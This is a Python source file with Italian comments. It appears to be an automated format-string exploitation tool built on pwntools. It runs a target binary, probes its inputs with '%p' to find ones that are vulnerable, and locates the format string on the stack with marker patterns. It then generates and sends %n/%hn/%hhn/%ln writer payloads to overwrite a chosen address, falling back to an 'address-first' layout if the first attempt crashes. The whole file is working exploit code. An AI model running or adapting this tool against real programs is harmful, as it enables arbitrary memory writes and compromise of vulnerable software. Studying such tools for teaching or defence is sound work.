import format_string_generator
import logger
import exceptions
from pwn import *


def format_pack(write_dimension, order_byte):
    if write_dimension == 8:
        architecture_char = "Q"
    elif write_dimension == 4:
        architecture_char = "L"
    elif write_dimension == 2:
        architecture_char = "H"
    elif write_dimension == 1:
        architecture_char = "B"

    if order_byte == "little":
        byte_char = "<"
    elif order_byte == "big":
        byte_char = ">"
    else:
        byte_char = ""

    return byte_char + architecture_char


def get_write_size(write_dimension, value, order_byte):
    byte_sizes = [8, 4, 2, 1]
    current_byte_sizes = [write_dimension]

    while True:
        j = 0
        bytes_list = []
        for byte_size in current_byte_sizes:
            bytes_list.append(value[j:j + byte_size])
            j += byte_size

        total_padding = 0

        values_list = []
        for hex_bytes in bytes_list:
            new_value = int.from_bytes(hex_bytes, byteorder=order_byte)
            values_list.append(new_value)
            total_padding += new_value

        if total_padding < 4000:
            print(*current_byte_sizes, sep=';')
            return current_byte_sizes, bytes_list
        else:
            max_index = values_list.index(max(values_list))
            current_byte_size = current_byte_sizes[max_index]

            byte_size_index = byte_sizes.index(current_byte_size)
            new_byte_size = byte_sizes[byte_size_index + 1]
            current_byte_sizes[max_index] = new_byte_size
            current_byte_sizes.insert(max_index, new_byte_size)


def define_markers(response):
    """
    :param response: stringa che contiene i dati ricevuti, in caratteri, dal processo target
    :return: una lista contenete due stringhe uniche nella risposta del processo target
    """
    for i in range(2, 50):
        for j in range(200):
            # rimossi a,b,c,d,e,f in quanto usati nei valori esadecimali; rimosso i per evitare combinaioni ni, il (rompono nil)
            test_markers = [''.join(random.choice("ghjklmnopqrstuvwxyz") for h in range(i)),
                            ''.join(random.choice("ghjklmnopqrstuvwxyz") for h in range(i))]

            print(test_markers)
            if response.count(test_markers[0]) == 0 and response.count(test_markers[1]) == 0:
                return test_markers

            j += 1
        i += 1

    raise exceptions.MarkersNotDefinedError


def get_wrapped_string(response, markers):
    """
    :param response: stringa che contiene i dati ricevuti, in caratteri, dal processo target
    :param markers: marcatori unici che fanno da estremi all'input attualmente in test stampato dal processo target
    :return: l'input passato stampato dal processo
    """
    print("get wrapped")
    print(response)
    try:
        found = re.search(markers[0] + '(.+?)' + markers[1], response)[1]
        print("found = " + str(found))
        return found
    except:
        print("Errore nell'estrazione della risposta")
        raise exceptions.MarkersNotFoundError


def get_addresses(response, markers):
    """
    :param response: stringa che contiene i dati ricevuti, in caratteri, dal processo target
    :param markers: marcatori unici che fanno da estremi all'input attualmente in test stampato dal processo target
    :return: lista conentente i valori esadecimali stampati dal processo tramite l'input passato
    """
    try:
        found = get_wrapped_string(response, markers)
        # replace("G", "") -> rimuovo il padding aggiuntivo delle fmt per input passati da command line necessario a rendere costante la loro dimensione
        return (found.replace("(nil)", "0x0").replace("G", "")).split("0x")[1:]
    except exceptions.MarkersNotFoundError as e:
        raise


class Exploit:
    """
    classe principale del tool; testa gli input disponibili verificando se sono exploitabili e se riescono a portare a termine l'exploit
    """
    def __init__(self, target, value, target_address, command_line_input_list, during_execution_input_list, configs):
        self.start_fmt_position = None  # posizione della fmt come entry dello stack

        self.target = target            # percorso del processo target
        self.target_address = target_address    # indirizzo a cui scrivere
        self.configs = configs

        e = ELF(target)
        self.order_byte = e.endian
        self.address_size = e.bytes

        # specifico quanti byte dell'indirizzo target scrivere
        self.write_dimension = self.configs["bytes_to_write"] if self.configs["bytes_to_write"] in [1, 2, 4, 8] else self.address_size

        self.command_line_input_list = command_line_input_list
        self.during_execution_input_list = during_execution_input_list

        self.value = struct.pack(format_pack(self.write_dimension, self.order_byte), value)

        self.direct_fmt_generator = format_string_generator.DirectFmtGenerator()

        self.logger = logger.Logger(self.target, self.configs)
        self.logger.write(
            "Dimensione indirizzi: {} byte\nEndian: {}\n\nInput da linea di comando: {}\nInput da passare durante l'esecuzione: {}".format(
                self.address_size, self.order_byte, self.command_line_input_list, self.during_execution_input_list))

        self.null_byte_in_address = False
        self.test_free_input()

    def send_payload(self, encoded=False):
        """
        :param encoded: specifica se l'input in test, da inviare al processo target durante l'esecuzione, è gia stato codificato
        :return: una stringa contenete i dati, in caratteri, ricevuti dal processo target
        """
        # Estraggo il valore degli input da linea di comando e li passo al processo target
        command_line_inputs = list()
        for elem in self.command_line_input_list:
            command_line_inputs.append(elem["value"])
        p = process([self.target] + command_line_inputs)
        print("Command line inputs " + str(self.command_line_input_list))

        total_response = ""
        try:
            # se ci sono input da passare a tempo di esecuzione
            if len(self.during_execution_input_list) > 0:
                # se per il primo di questi input è specificato il marker ricevo dati finchè il processo non arriva al marker
                if self.during_execution_input_list[0]["marker"] is not None:
                    if self.configs["wait_time_marker"] == -1:
                        total_response += p.recvuntil(delims=self.during_execution_input_list[0]["marker"]).decode(
                            "latin1")
                    else:
                        total_response += p.recvuntil(delims=self.during_execution_input_list[0]["marker"],
                                                      timeout=self.configs["wait_time_marker"]).decode("latin1")

                else:
                    # se l'input non ha marker, ricevo i dati per "wait_time_no_marker" secondi
                    total_response += p.recvrepeat(self.configs["wait_time_no_marker"]).decode("latin1")

                for i in range(0, len(self.during_execution_input_list)):
                    elem = self.during_execution_input_list[i]

                    # se ho specificato encoded e l'input è quello che sto testando in questo momento, allora il suo valore è già codificato
                    if encoded is True and elem["value"] != "PPPP" and elem["free"] is True:
                        p.sendline(elem["value"])
                    else:
                        p.sendline(str.encode(elem["value"]))

                    if i < len(self.during_execution_input_list) - 1:

                        if self.during_execution_input_list[i]["marker"] is not None:
                            if self.configs["wait_time_marker"] == -1:
                                response = p.recvuntil(self.during_execution_input_list[i + 1]["marker"]).decode(
                                    "latin1")
                            else:
                                response = p.recvuntil(self.during_execution_input_list[i + 1]["marker"],
                                                       timeout=self.configs["wait_time_marker"]).decode("latin1")
                        else:
                            response = p.recvrepeat(self.configs["wait_time_no_marker"]).decode("latin1")

                    else:
                        # se l'input che sto inviando è l'ultimo nella lista, allora ricevo i dati fino all'End Of File
                        response = p.recvall().decode("latin1")

                    print(response)
                    total_response += response

            else:
                # se non ci sono input da passare durante l'esecuzione ricevo sempplicemente finchè il processo target non termina
                total_response = p.recvall(timeout=self.configs["wait_time_no_marker"]).decode("latin1")
                print(total_response)
        except (EOFError, BrokenPipeError) as e:
            raise

        if p.poll() == -11:
            raise exceptions.SegfaultError

        return total_response

    def prepare_writer(self):
        """
        :return: un valore intero che corrisponde alla somma della lunghezza in caratteri degli indirizzi target, il paddign necessario a
        il raggiungere il valore da scrivere in ciascun indirizzo e il relativo scrittore (hhn, hn, n, ln)

        """
        write_size, value_padding = get_write_size(self.write_dimension, self.value, self.order_byte)
        print("WRITE_SIZE: ")
        print(write_size)

        target_addresses = list()
        values = list()
        addr = self.target_address
        for i in write_size:
            print("Target address " + hex(addr))
            # verifico se almeno uno degli indirizzi target contiene un null byte. Questo si verifica se effettivamente lo contiene oppure
            # se la sua dimensione è inferiore a quella prevista per l'indirizzamento del processo
            if ("00" in [hex(addr)[i:i + 2] for i in range(0, len(hex(addr)), 2)]) or len(hex(addr)) < (self.address_size*2):
                print(hex(addr))
                self.null_byte_in_address = True

            target_addresses.append(struct.pack(format_pack(self.address_size, self.order_byte), addr))
            addr = addr + i

        for bytes in value_padding:
            # values.append(bytes)
            values.append(int.from_bytes(bytes, byteorder=self.order_byte))

        target_addresses = [address for _, address, _ in sorted(zip(values, target_addresses, write_size))]
        write_size = [w_size for _, _, w_size in sorted(zip(values, target_addresses, write_size))]
        values.sort()

        counter = 0
        writers_len = 0
        for value, address, w_size in zip(values, target_addresses, write_size):
            print(str(value) + ', ' + address.decode("latin1"))

            if w_size == 8:
                writer = "ln"
            elif w_size == 4:
                writer = "n"
            elif w_size == 2:
                writer = "hn"
            elif w_size == 1:
                writer = "hhn"

            print('counter ' + str(counter))
            # print(str(len(self.string_generator.)))
            print('value is ' + str(value))

            padding = value - counter
            counter += padding

            if padding < 8:
                padding = "A" * padding
            else:
                padding = "%" + str(padding) + "x"

            print("writer:")
            print(writer)
            self.direct_fmt_generator.add_writer([padding, None, writer])
            writers_len += len(padding) + len(writer)

        self.direct_fmt_generator.set_writer_backup()
        self.direct_fmt_generator.set_address(target_addresses)

        print("writer_len " + str(writers_len))
        print("addr_len " + str(len(target_addresses) * self.address_size))

        return writers_len + len(target_addresses) * self.address_size

    def get_input_len_in_target(self, input_elem, markers, fmt_length_without_writer_position):
        """
        :param input_elem: input in test
        :param markers: marcatori unici del processo
        :param fmt_length_without_writer_position: intero rappresentante una parte della dimensione in caratteri della fmt finale
        :return:
        """
        input_len = 0
        max_len = 500 + fmt_length_without_writer_position + len(markers[0] + markers[1])
        i = fmt_length_without_writer_position // len(markers[0])
        try:
            while i <= max_len:
                input_elem["value"] = markers[0] * i
                response = self.send_payload()
                input_len = response.count(markers[0])
                if input_len != i or input_len == max_len:
                    return input_len * len(markers[0])
                i += (50 // len(markers[0])) if max_len - i >= (50 // len(markers[0])) else max_len - i
                print("i = " + str(i))

        except (exceptions.SegfaultError, EOFError):
            print(input_len)
            try:
                print(i)
                i = fmt_length_without_writer_position // len(markers[0]) if i <= fmt_length_without_writer_position // len(markers[0]) else i - (50 // len(markers[0]))
                print(i)
                while i != max_len:
                    input_elem["value"] = markers[0] * i
                    print(input_elem["value"])
                    response = self.send_payload()
                    print("kkkkkkkkkkkkk")
                    input_len = response.count(markers[0])
                    print(input_len)
                    print("kkkkkkkkkkkkk")
                    if input_len != i or input_len == max_len:
                        return input_len * len(markers[0])
                    i += 1
            except (exceptions.SegfaultError, EOFError):
                print("heml")
                print(i)
                print(input_len * len(markers[0]))
                return input_len * len(markers[0])

    def test_free_input(self):
        """
        :return:

        metodo principale del tool, verifica i vari input e determina se possono exploitare il processo target e se ci riescono
        """
        self.logger.write("\n\n\nInizio ricerca di input vulnerabili\n\n")

        fmt_length_without_writer_position = self.prepare_writer()
        for input_elem in (self.command_line_input_list + self.during_execution_input_list):
            self.logger.write("Input in test: {}\n".format(input_elem))

            if input_elem["free"] is False:
                self.logger.write("Input non libero\n\n")
                continue

            try:
                if input_elem["type"] == "command_line_input" and self.null_byte_in_address:
                    raise exceptions.NullByteInAddressError

                self.logger.write("Input libero, verifica se exploitabile: ")

                min_len_pattern = ''.join(
                    random.choice(string.ascii_uppercase) for i in range(fmt_length_without_writer_position))

                response = self.send_payload()

                print(response)
                min_len_pattern_occ = response.count(min_len_pattern)
                zero_x_occ = response.count("0x")
                percent_p_occ = response.count("%p")
                nil_occ = response.count("(nil)")

                input_elem["value"] = "%p"
                response = self.send_payload()

                # se l'input in test viene stampato nel processo più di una volta oppure in %p non viene interpretato, l'input viene scartato
                if not (((response.count("0x") == zero_x_occ + 1 and response.count("(nil)") == nil_occ) or
                        (response.count("0x") != zero_x_occ or response.count("(nil)") == nil_occ + 1))
                        and response.count("%p") == percent_p_occ):

                    raise exceptions.InputNotVulnerableError

                # verifico se l'input stampato raggiunge la dimensione minima fmt_length_without_writer_position. Se non la raggiunge
                # e il controllo sulla lunghezza dell'input ("input_len_control") è attivo, l'input è scartato
                self.logger.write("input exploitabile\n")
                self.logger.write("Verifica stampa della dimensione minima della stringa di exploit ({} caratteri): ".format(fmt_length_without_writer_position))
                input_elem["value"] = min_len_pattern
                try:
                    response = self.send_payload()
                except exceptions.SegfaultError:
                    raise exceptions.SegfaultError("impossibile testare input, incontrato segmentation fault\n\n")

                if response.count(min_len_pattern) == min_len_pattern_occ:
                    if self.configs["input_len_control"] is True:
                        raise exceptions.InputTooLittleError("dimensione non sufficiente a stampare l'fmt\n\n")
                    else:
                        fmt_length_without_writer_position = 0
                        self.logger.write("dimensione minima stampata non raggiunta; si prosegue comunque con i test sull'input corrente essendo disattivato il controllo sulla lunghezza\n")
                else:
                    self.logger.write("dimensione minima stampata\n")

                # definisco i marcatori unici per il processo target
                self.logger.write("Definizione marcati per estrarre fmt nella risposta: ")
                markers = define_markers(response)
                self.logger.write("{}, {}\n".format(markers[0], markers[1]))

                # Provo a capire quanti caratteri posso passare all'input
                # (fino a 500 + fmt_length_without_writer_position + len(markers[0] + markers[1]))
                self.logger.write("Conteggio della dimensione effettiva dell'input (fino a {} caratteri): ".format(
                    500 + fmt_length_without_writer_position + len(markers[0] + markers[1])))

                print(markers)
                print(response)
                input_len = self.get_input_len_in_target(input_elem, markers, fmt_length_without_writer_position) - len(markers[0] + markers[1])

                self.logger.write("{} caratteri disponibili + {} caratteri usati dai marcatori\n".format(input_len, len(
                    markers[0] + markers[1])))

                # ricerco la posizione iniziale dell'input passato all'interno dello stack del processo target
                self.logger.write("Ricerca fmt su stack: ")
                shift_for_broken_pattern = self.find_fmt_position_on_stack(input_elem, input_len, markers)

                self.logger.write("posizione {}\n".format(self.start_fmt_position))
                self.logger.write("Generazione fmt per exploit nel formato 'scrittori-indirizzi': ")
                self.define_exploit_string(input_elem, input_len, markers, shift_for_broken_pattern)
                return

            except (
                    exceptions.NullByteInAddressError, exceptions.SegfaultError, exceptions.MarkersNotFoundError,
                    EOFError,
                    exceptions.InputTooLittleError, exceptions.MarkersNotDefinedError,
                    exceptions.InputNotVulnerableError, BrokenPipeError) as e:
                if type(e) is exceptions.SegfaultError:
                    self.logger.write(str(e))
                if type(e) is EOFError:
                    self.logger.write("impossibile testare input, incontrato EOF non previsto\n\n")
                if type(e) is exceptions.InputTooLittleError:
                    self.logger.write(str(e))
                if type(e) is exceptions.MarkersNotDefinedError:
                    self.logger.write("impossibile definire marcatori\n\n")
                if type(e) is exceptions.MarkersNotFoundError:
                    self.logger.write("marcatori non individuati nella risposta\n\n")
                if type(e) is exceptions.InputNotVulnerableError:
                    self.logger.write("l'input non sembra vulnerabile\n\n")
                if type(e) is exceptions.NullByteInAddressError:
                    self.logger.write("almeno un indirizzo target contiene un null byte che non può essere inviato a causa della categoria di input o della costruzione della fmt di exploit\n\n")
                if type(e) is BrokenPipeError:
                    self.logger.write("rilevata BrokenPipe\n\n")

                input_elem["free"] = False
                input_elem["value"] = "PPPP"
                self.direct_fmt_generator.reset_direct_parameter_num()
                self.direct_fmt_generator.restore_writers()
                self.direct_fmt_generator.reset_align_padding()
                continue

        self.logger.write("Nessun input exploitabile individuato")

    def find_fmt_position_on_stack(self, input_in_testing, input_len, markers):
        """
        :param input_in_testing: input in test
        :param input_len: dimensione dell'input stampato
        :param markers: marcatori unice del processo
        :return: un intero che indica quanti caratteri aggiungere all'inizio della fmt affinchè il pattern cercato sia allineato nello stack

        verifica se l'fmt passata è presente nello stack (cercando uno specifico pattern) e ne salva la posizione in self.start_fmt_position

        Attenzione: il valore di ritorno sarà sempre >= self.address_size - len(markers[0]). Questo perchè l'fmt generata da format_string_generator
        è preceduta dal marcatore markers[0], per poter essere trovata nella risposta
        """
        try:
            checked_addresses = 0
            segfault_count = 0
            markers_not_found_count = 0
            while True:
                # setto nell'input il pattern che devo cercare poi nello stack
                pattern = "AAAAAAAA" if self.address_size == 8 else "AAAA"
                self.direct_fmt_generator.set_temp_address(pattern)

                found = False
                position = None
                shift_for_broken_pattern = 0
                while not found:

                    if segfault_count == 1:
                        fmt = self.direct_fmt_generator.generate_next_fmt_for_find_pattern_segfault(input_len)
                        input_in_testing["value"] = markers[0] + fmt + markers[1]
                    elif markers_not_found_count == 1:
                        fmt = self.direct_fmt_generator.generate_next_fmt_for_find_pattern_markers_not_found(input_len)
                        input_in_testing["value"] = markers[0] + fmt[0] + markers[1] + fmt[1]
                    else:
                        fmt = self.direct_fmt_generator.generate_next_fmt_for_find_pattern(input_len)
                        input_in_testing["value"] = markers[0] + fmt + markers[1]

                    print(str(fmt))

                    try:
                        response = self.send_payload()
                    except exceptions.SegfaultError as e:
                        if segfault_count == 0:
                            segfault_count += 1
                            self.direct_fmt_generator.set_direct_parameter_num(checked_addresses if checked_addresses > 0 else 1)
                            continue
                        else:
                            raise

                    print(response)

                    try:
                        addresses = get_addresses(response, markers)
                    except exceptions.MarkersNotFoundError as e:
                        if markers_not_found_count == 0:
                            markers_not_found_count += 1
                            self.direct_fmt_generator.set_direct_parameter_num(checked_addresses)
                            print("----------------------------------------")
                            print(markers_not_found_count)
                            continue
                        else:
                            raise

                    hex_pattern = pattern.encode().hex()
                    print(fmt)
                    for i in range(len(addresses)):
                        print("INDIRIZZO " + str(i) + " -> " + str(addresses[i]))
                        if addresses[i] == hex_pattern:
                            position = i
                            # positio + 1 + checked = 12 -> pos att -> controllo dalla 13 -> setto 14
                            self.direct_fmt_generator.set_direct_parameter_num(
                                (position + 1 + checked_addresses) + 2)  # salto la posizione corrente position+1
                            break
                        elif i < len(addresses) - 1:
                            if addresses[i].count("00") == 0 and addresses[i + 1].count("00") == 0 and \
                                    addresses[i].count(hex_pattern[0:2]) + addresses[i + 1].count(
                                hex_pattern[0:2]) == self.address_size:
                                position = i
                                shift_for_broken_pattern = addresses[i].count(hex_pattern[0:2])
                                self.direct_fmt_generator.set_direct_parameter_num(
                                    (position + 1 + checked_addresses) + 2)
                                break
                            #
                            elif addresses[i].count("00") > 0 or addresses[i + 1].count("00") > 0:
                                count_curr_addr = (addresses[i].split("00"))[0].count(hex_pattern[0:2])
                                count_next_addr = (addresses[i + 1].split("00"))[1].count(hex_pattern[0:2]) if \
                                    addresses[i + 1].count("00") > 0 else addresses[i + 1].count(hex_pattern[0:2])
                                if count_curr_addr + count_next_addr == self.address_size:
                                    position = i
                                    shift_for_broken_pattern = count_curr_addr
                                    self.direct_fmt_generator.set_direct_parameter_num(
                                        (position + 1 + checked_addresses) + 2)
                                    break

                    print("Position: " + str(position))

                    if position is not None:
                        found = True
                    else:
                        print(len(addresses))
                        checked_addresses += len(addresses) - 1
                        print("cheched addresses " + str(checked_addresses))

                print("Cerco b")
                confirm_pattern = "BBBBBBBB" if self.address_size == 8 else "BBBB"
                hex_confirm_pattern = confirm_pattern.encode().hex()

                input_in_testing["value"] = input_in_testing["value"].replace("A", "B")

                response = self.send_payload()
                print(response)

                addresses = get_addresses(response, markers)

                print("Address " + str(position) + " = " + str(addresses[position]))
                print("Address " + str(position + 1) + " = " + str(addresses[position + 1]))

                print("QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ")
                if addresses[position] == hex_confirm_pattern:
                    self.start_fmt_position = position + 1 + checked_addresses
                    print("Posizione iniziale " + str(self.start_fmt_position + 1))

                    return 0
                elif addresses[position].count("00") == 0 and addresses[position + 1].count("00") == 0 and \
                        addresses[position].count(hex_confirm_pattern[0:2]) + addresses[position + 1].count(
                    hex_confirm_pattern[0:2]) == self.address_size:
                    self.start_fmt_position = (position + 1) + checked_addresses

                    return shift_for_broken_pattern
                elif addresses[position].count("00") > 0 or addresses[position + 1].count("00") > 0:
                    count_curr_addr = (addresses[position].split("00"))[0].count(hex_confirm_pattern[0:2])
                    count_next_addr = (addresses[position + 1].split("00"))[1].count(hex_confirm_pattern[0:2]) if \
                        addresses[position + 1].count("00") > 0 else addresses[position + 1].count(
                        hex_confirm_pattern[0:2])

                    if count_curr_addr + count_next_addr == self.address_size:
                        self.start_fmt_position = (position + 1) + checked_addresses

                        return shift_for_broken_pattern

                checked_addresses += position + 1
                print(".................................. + " + str(checked_addresses))

        except (exceptions.InputTooLittleError, exceptions.MarkersNotFoundError, exceptions.SegfaultError) as e:
            if type(e) is exceptions.SegfaultError:
                raise exceptions.SegfaultError("fmt non trovata nello stack, ricerca terminata a causa di un errore di segmentation fault\n\n")
            elif type(e) is exceptions.InputTooLittleError:
                raise exceptions.InputTooLittleError("l'input stampato non è abbastanza lungo da permettere di continuare la ricerca della fmt nello stack\n\n")
            else:
                raise

    def define_exploit_string(self, input_elem, input_len, markers, shift_for_broken_pattern):
        try:
            writers = self.direct_fmt_generator.writers

            current_offset = 0
            for writer in writers:
                current_offset += len(str(writer[0]) + str(writer[2]))

            print("Current_offset " + str(current_offset))
            print(shift_for_broken_pattern)

            # %0pos$
            total_offset = current_offset + (1 + (1 + len(str(self.start_fmt_position))) + 1) * len(writers)
            address_position_incr = total_offset // self.address_size
            not_covered_offset = total_offset % self.address_size

            print("not_covered " + str(not_covered_offset))

            align_padding = ""
            if (shift_for_broken_pattern + len(markers[0])) != self.address_size:
                address_position_incr += 1
                align_padding += "-" * shift_for_broken_pattern
            if not_covered_offset > 0:
                address_position_incr += 1
                align_padding += "." * (self.address_size - not_covered_offset)

            self.direct_fmt_generator.set_align_padding(align_padding)

            i = 0
            for writer in writers:
                pos = "0" + str(address_position_incr + self.start_fmt_position + i) if len(
                    str(address_position_incr + self.start_fmt_position)) == len(str(self.start_fmt_position)) else str(
                    address_position_incr + self.start_fmt_position + i)
                pos = "%" + pos + "$"
                writer[1] = pos
                i += 1

            if input_elem["type"] == "execution_input":
                exploit, exploit_len = self.direct_fmt_generator.generate_exploit_fmt_in_byte(input_len, markers[0], "execution_input")
            else:
                if shift_for_broken_pattern + len(markers[0]) != self.address_size:
                    exploit, exploit_len = self.direct_fmt_generator.generate_exploit_fmt_in_byte(input_len, markers[0], "command_line_input")
                    exploit += markers[1].encode()
                    exploit_len += len(markers[1])
                else:
                    exploit, exploit_len = self.direct_fmt_generator.generate_exploit_fmt_in_byte(input_len, "", "command_line_input")
                    exploit += markers[0].encode() + markers[1].encode()
                    exploit_len += len(markers[0] + markers[1])

            print(exploit)
            if self.configs["input_len_control"] is True and exploit_len > input_len:
                raise exceptions.InputTooLittleError("la dimensione dell'input non è suffichiente a stampare l'fmt di exploit, {} caratteri richiesti\n\n".format(exploit_len))

            self.logger.write("generazione completata con successo\n")
            self.logger.write("La stringa generata è: \n\t\t{}\n".format(exploit))
            self.logger.write("Inizio exploit: ")
            input_elem["value"] = exploit
            response = self.send_payload(True)

            self.logger.write(
                "La risposta è:\n----------------------------------------\n{}\n----------------------------------------\n".format(
                    response))
            return
        except exceptions.SegfaultError as e:
            self.logger.write(
                "segmentation fault incontrato tentando l'exploit \nPassaggo alla generazione della stringa nel formato 'indirizzi-scrittori': ")
            self.direct_fmt_generator.reset_align_padding()
            self.exploit_old_format(input_elem, input_len, markers, shift_for_broken_pattern)

    def exploit_old_format(self, input_elem, input_len, markers, shift_for_broken_pattern):
        if self.null_byte_in_address is True:
            raise exceptions.NullByteInAddressError

        writer = self.direct_fmt_generator.writers[0]

        if (shift_for_broken_pattern + len(markers[0])) != self.address_size:
            chars_to_add = self.address_size * len(self.direct_fmt_generator.writers) + shift_for_broken_pattern + len(
                markers[0])
        else:
            chars_to_add = self.address_size * len(self.direct_fmt_generator.writers)

        if "A" in writer[0]:
            if len(writer[0]) >= chars_to_add:
                writer[0] = "A" * (len(writer[0]) - chars_to_add)
            else:
                self.logger.write(
                    "impossibile costruire la fmt, il valore da scrivere è inferiore alla dimensione degli indirizzi")
                return
        elif writer[0] == "":
            self.logger.write(
                "impossibile costruire la fmt, il valore da scrivere è inferiore alla dimensione degli indirizzi")
            return
        else:
            padding = re.search("%" + '(.+?)' + "x", writer[0])[1]
            if int(padding) >= chars_to_add:
                padding = int(padding) - chars_to_add

                if padding < 8:
                    writer[0] = "A" * padding
                else:
                    writer[0] = "%" + str(padding) + "x"
            else:
                self.logger.write(
                    "impossibile costruire la fmt, il valore da scrivere è inferiore alla dimensione degli indirizzi")
                return

        print("NEW = " + writer[0])
        print("\n")

        i = 0
        for w in self.direct_fmt_generator.writers:
            pos = "0" + str(self.start_fmt_position + i) if len(str(self.start_fmt_position)) == len(
                str(self.start_fmt_position)) else str(self.start_fmt_position + i)

            pos = "%" + pos + "$"
            w[1] = pos

            print(writer)
            print("||||||||||||||||||||||||||||||||||||||||||||||||||")

        try:
            if input_elem["type"] == "execution_input":
                exploit, exploit_len = self.direct_fmt_generator.generate_exploit_fmt_in_byte_address_first(input_len, markers[0], "execution_input")
            else:
                if (shift_for_broken_pattern + len(markers[0])) != self.address_size:
                    self.direct_fmt_generator.set_align_padding("." * shift_for_broken_pattern)
                    exploit, exploit_len = self.direct_fmt_generator.generate_exploit_fmt_in_byte_address_first(input_len, markers[0], "command_line_input")
                    exploit += markers[1].encode()
                    exploit_len += len(markers[1])
                else:
                    exploit, exploit_len = self.direct_fmt_generator.generate_exploit_fmt_in_byte_address_first(input_len, "", "command_line_input")
                    exploit += markers[0].encode() + markers[1].encode()
                    exploit_len += len(markers[0] + markers[1])

            if self.configs["input_len_control"] is True and exploit_len > input_len:
                raise exceptions.InputTooLittleError("la dimensione dell'input non è suffichiente a stampare l'fmt di exploit, {} caratteri richiesti\n\n".format(exploit_len))

            self.logger.write("generazione completata con successo\n")
            self.logger.write("La stringa generata è: \n\t\t{}\n".format(exploit))
            self.logger.write("Inizio exploit: ")
            input_elem["value"] = exploit
            response = self.send_payload(True)

            self.logger.write(
                "La risposta è:\n----------------------------------------\n{}\n----------------------------------------\n".format(
                    response))
            return
        except exceptions.SegfaultError as e:
            raise exceptions.SegfaultError("segmentation fault incontrato tentando l'exploit\n\n")

